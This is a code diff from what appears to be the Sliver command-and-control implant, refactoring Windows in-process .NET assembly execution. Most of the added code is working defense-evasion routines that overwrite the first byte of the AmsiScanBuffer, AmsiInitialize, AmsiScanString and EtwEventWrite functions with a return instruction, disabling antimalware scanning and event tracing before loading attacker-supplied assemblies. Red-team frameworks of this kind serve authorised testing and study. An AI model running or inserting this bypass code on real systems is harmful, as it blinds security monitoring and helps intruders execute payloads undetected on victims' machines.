@@ -25,8 +25,6 @@ import (
 	// {{if .Config.Debug}}
 	"log"
 	// {{else}}{{end}}
-	"errors"
-	"fmt"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -41,7 +39,6 @@ import (
 
 	// {{end}}
 
-	clr "github.com/Ne0nd0g/go-clr"
 	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"golang.org/x/sys/windows"
 )
@@ -203,153 +200,94 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
-func getDotnetRutnimes() ([]string, error) {
-	metaHost, err := clr.CLRCreateInstance(clr.CLSID_CLRMetaHost, clr.IID_ICLRMetaHost)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("could not create CLR instance: %v\n", err)
-		// {{end}}
-		return nil, err
-	}
-	runtimes, err := clr.GetInstalledRuntimes(metaHost)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("could not get installed runtimes: %v\n", err)
-		// {{end}}
-		return nil, err
-	}
-	return runtimes, nil
-}
+func patchAmsi() error {
+	// load amsi.dll
+	amsiDLL := windows.NewLazyDLL("amsi.dll")
+	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
+	amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
+	amsiScanString := amsiDLL.NewProc("AmsiScanString")
 
-func isSupportedRuntime(runtime string) bool {
-	runtimes, err := getDotnetRutnimes()
-	if err != nil {
-		return false
+	// patch
+	amsiAddr := []uintptr{
+		amsiScanBuffer.Addr(),
+		amsiInitialize.Addr(),
+		amsiScanString.Addr(),
 	}
-	for _, r := range runtimes {
-		if runtime == r {
-			return true
-		}
-	}
-	return false
-}
-
-func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime string, amsiBypass bool, etwBypass bool) (string, error) {
-	if amsiBypass {
-		// load amsi.dll
-		amsiDLL := windows.NewLazyDLL("amsi.dll")
-		amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
-		amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
-		amsiScanString := amsiDLL.NewProc("AmsiScanString")
-
-		// patch
-		amsiAddr := []uintptr{
-			amsiScanBuffer.Addr(),
-			amsiInitialize.Addr(),
-			amsiScanString.Addr(),
-		}
-		patch := byte(0xC3)
-		for _, addr := range amsiAddr {
-			// skip if already patched
-			if *(*byte)(unsafe.Pointer(addr)) != patch {
-				// {{if .Config.Debug}}
-				log.Println("Patching AMSI")
-				// {{end}}
-				var oldProtect uint32
-				err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
-				if err != nil {
-					//{{if .Config.Debug}}
-					log.Println("VirtualProtect failed:", err)
-					//{{end}}
-					return "", err
-				}
-				*(*byte)(unsafe.Pointer(addr)) = 0xC3
-				err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
-				if err != nil {
-					//{{if .Config.Debug}}
-					log.Println("VirtualProtect (restauring) failed:", err)
-					//{{end}}
-					return "", err
-				}
-			}
-		}
-	}
-	if etwBypass {
-		ntdll := windows.NewLazyDLL("ntdll.dll")
-		etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
-
-		// patch
-		patch := byte(0xC3)
+	patch := byte(0xC3)
+	for _, addr := range amsiAddr {
 		// skip if already patched
-		if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
+		if *(*byte)(unsafe.Pointer(addr)) != patch {
 			// {{if .Config.Debug}}
-			log.Println("Patching ETW")
+			log.Println("Patching AMSI")
 			// {{end}}
 			var oldProtect uint32
-			err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
+			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
 			if err != nil {
 				//{{if .Config.Debug}}
 				log.Println("VirtualProtect failed:", err)
 				//{{end}}
-				return "", err
+				return err
 			}
-			*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
-			err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
+			*(*byte)(unsafe.Pointer(addr)) = 0xC3
+			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
 			if err != nil {
 				//{{if .Config.Debug}}
 				log.Println("VirtualProtect (restauring) failed:", err)
 				//{{end}}
-				return "", err
+				return err
 			}
 		}
 	}
-	err := clr.RedirectStdoutStderr()
-	if err != nil {
+	return nil
+}
+
+func patchEtw() error {
+	ntdll := windows.NewLazyDLL("ntdll.dll")
+	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
+
+	// patch
+	patch := byte(0xC3)
+	// skip if already patched
+	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
 		// {{if .Config.Debug}}
-		log.Printf("could not redirect stdout/stderr: %v\n", err)
+		log.Println("Patching ETW")
 		// {{end}}
-		return "", err
+		var oldProtect uint32
+		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
+		if err != nil {
+			//{{if .Config.Debug}}
+			log.Println("VirtualProtect failed:", err)
+			//{{end}}
+			return err
+		}
+		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
+		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
+		if err != nil {
+			//{{if .Config.Debug}}
+			log.Println("VirtualProtect (restauring) failed:", err)
+			//{{end}}
+			return err
+		}
 	}
-	runtimes, err := getDotnetRutnimes()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("could not get installed runtimes: %v\n", err)
-		// {{end}}
-		return "", err
+	return nil
+}
+
+func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime string, amsiBypass bool, etwBypass bool) (string, error) {
+	if amsiBypass {
+		err := patchAmsi()
+		if err != nil {
+			return "", err
+		}
 	}
-	if len(runtimes) == 0 {
-		// {{if .Config.Debug}}
-		log.Printf("no runtimes found")
-		// {{end}}
-		return "", errors.New("no runtimes found")
+
+	if etwBypass {
+		err := patchEtw()
+		if err != nil {
+			return "", err
+		}
 	}
-	rt := runtimes[0]
-	if runtime != "" && isSupportedRuntime(runtime) {
-		rt = runtime
-	}
-	// {{if .Config.Debug}}
-	log.Printf("using runtime: %s", rt)
-	// {{end}}
-	runtimeHost := clrInstance.GetRuntimeHost(rt)
-	// {{if .Config.Debug}}
-	log.Println("CLR loaded")
-	// {{end}}
-	methodInfo, err := clr.LoadAssembly(runtimeHost, assemblyBytes)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("could not load assembly: %v\n", err)
-		// {{end}}
-		return "", err
-	}
-	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
-		assemblyArgs = []string{" "}
-	}
-	// {{if .Config.Debug}}
-	log.Printf("Assembly loaded, methodInfo: %+v\n", methodInfo)
-	log.Printf("Calling assembly with args: %+v\n", assemblyArgs)
-	// {{end}}
-	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
-	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
+
+	return LoadAssembly(assemblyBytes, assemblyArgs, runtime)
 }
 
 func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {
